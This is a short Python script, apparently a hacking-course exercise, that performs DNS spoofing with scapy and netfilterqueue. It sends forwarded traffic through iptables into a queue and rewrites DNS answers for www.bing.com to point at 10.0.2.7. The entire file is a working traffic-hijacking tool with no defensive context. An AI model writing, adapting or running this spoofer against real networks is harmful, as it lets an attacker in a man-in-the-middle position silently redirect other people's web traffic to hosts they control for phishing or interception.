#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy

def proccess_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            print("[+] Spoofing target: {}".format(qname))
            answer = scapy.DNSRR(
                rrname=qname,
                rdata="10.0.2.7"
            )
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()

# For local Testing
# subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

# For Forwarding remote network
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, proccess_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("\nStopped.. IP Tables Flushed")